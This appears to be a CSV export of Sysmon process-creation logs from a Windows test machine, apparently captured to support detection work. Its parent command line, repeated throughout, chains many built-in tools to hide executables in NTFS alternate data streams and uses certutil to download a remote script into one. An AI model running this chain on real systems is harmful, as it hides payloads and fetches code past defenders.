/o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b16-658d-6a02-000000000b00},7044,2620,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:54.0302763Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:54.027,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.0302763Z""/>
      <EventRecordID>9453</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:54.027</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b16-658d-6a02-000000000b00}</Data>
      <Data Name=""ProcessId"">2620</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">reg  export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.027

ProcessGuid: {fda94052-4b16-658d-6a02-000000000b00}

ProcessId: 2620

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg  export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,print  /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Print Utility,,,,,,,1,9452,,10.0.22621.1 (WinBuild.160101.0800),"MD5=B694D9D775EC5090AEF1D6EDB300260A,SHA256=AEECAEDECCC9DCB0A8D910503F876EF8B9A75F0F2DCA1363992BEFA0F6D11C15,IMPHASH=D67C73847BD1DC0D9109BA544AD6C11D",C:\Windows\System32\print.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.004

ProcessGuid: {fda94052-4b16-658d-6902-000000000b00}

ProcessId: 3936

Image: C:\Windows\System32\print.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Print Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Print.Exe

CommandLine: print  /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=B694D9D775EC5090AEF1D6EDB300260A,SHA256=AEECAEDECCC9DCB0A8D910503F876EF8B9A75F0F2DCA1363992BEFA0F6D11C15,IMPHASH=D67C73847BD1DC0D9109BA544AD6C11D

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,Print.Exe,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b16-658d-6902-000000000b00},7044,3936,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:54.0060580Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:54.004,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:54.0060580Z""/>
      <EventRecordID>9452</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:54.004</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b16-658d-6902-000000000b00}</Data>
      <Data Name=""ProcessId"">3936</Data>
      <Data Name=""Image"">C:\Windows\System32\print.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Print Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Print.Exe</Data>
      <Data Name=""CommandLine"">print  /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=B694D9D775EC5090AEF1D6EDB300260A,SHA256=AEECAEDECCC9DCB0A8D910503F876EF8B9A75F0F2DCA1363992BEFA0F6D11C15,IMPHASH=D67C73847BD1DC0D9109BA544AD6C11D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:54.004

ProcessGuid: {fda94052-4b16-658d-6902-000000000b00}

ProcessId: 3936

Image: C:\Windows\System32\print.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Print Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Print.Exe

CommandLine: print  /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=B694D9D775EC5090AEF1D6EDB300260A,SHA256=AEECAEDECCC9DCB0A8D910503F876EF8B9A75F0F2DCA1363992BEFA0F6D11C15,IMPHASH=D67C73847BD1DC0D9109BA544AD6C11D

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,makecab  c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft® Cabinet Maker,,,,,,,1,9451,,5.00 (WinBuild.160101.0800),"MD5=6366D436F32422B05F664361FE177201,SHA256=C194C06CE57874DBDCF0EBA18AF91C816827F77DB19A42A9FC1E0BEC81EB27C8,IMPHASH=A9326A6F3C34256D97D8CD7972ACC242",C:\Windows\System32\makecab.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.983

ProcessGuid: {fda94052-4b15-658d-6802-000000000b00}

ProcessId: 784

Image: C:\Windows\System32\makecab.exe

FileVersion: 5.00 (WinBuild.160101.0800)

Description: Microsoft® Cabinet Maker

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: makecab.exe

CommandLine: makecab  c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=6366D436F32422B05F664361FE177201,SHA256=C194C06CE57874DBDCF0EBA18AF91C816827F77DB19A42A9FC1E0BEC81EB27C8,IMPHASH=A9326A6F3C34256D97D8CD7972ACC242

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User",Info,makecab.exe,"""cmd.exe"" /c type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" & extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe & findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe & certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt & makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab & print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe & reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg & regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey & expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat & esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o",C:\Windows\System32\cmd.exe,{fda94052-4b15-658d-6402-000000000b00},5324,WINDEV2309EVAL\User,{fda94052-4b15-658d-6802-000000000b00},7044,784,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:53.9870445Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:53.983,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:53.9870445Z""/>
      <EventRecordID>9451</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:53.983</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b15-658d-6802-000000000b00}</Data>
      <Data Name=""ProcessId"">784</Data>
      <Data Name=""Image"">C:\Windows\System32\makecab.exe</Data>
      <Data Name=""FileVersion"">5.00 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft&#174; Cabinet Maker</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">makecab.exe</Data>
      <Data Name=""CommandLine"">makecab  c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=6366D436F32422B05F664361FE177201,SHA256=C194C06CE57874DBDCF0EBA18AF91C816827F77DB19A42A9FC1E0BEC81EB27C8,IMPHASH=A9326A6F3C34256D97D8CD7972ACC242</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-4b15-658d-6402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5324</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.983

ProcessGuid: {fda94052-4b15-658d-6802-000000000b00}

ProcessId: 784

Image: C:\Windows\System32\makecab.exe

FileVersion: 5.00 (WinBuild.160101.0800)

Description: Microsoft&#174; Cabinet Maker

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: makecab.exe

CommandLine: makecab  c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=6366D436F32422B05F664361FE177201,SHA256=C194C06CE57874DBDCF0EBA18AF91C816827F77DB19A42A9FC1E0BEC81EB27C8,IMPHASH=A9326A6F3C34256D97D8CD7972ACC242

ParentProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ParentProcessId: 5324

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
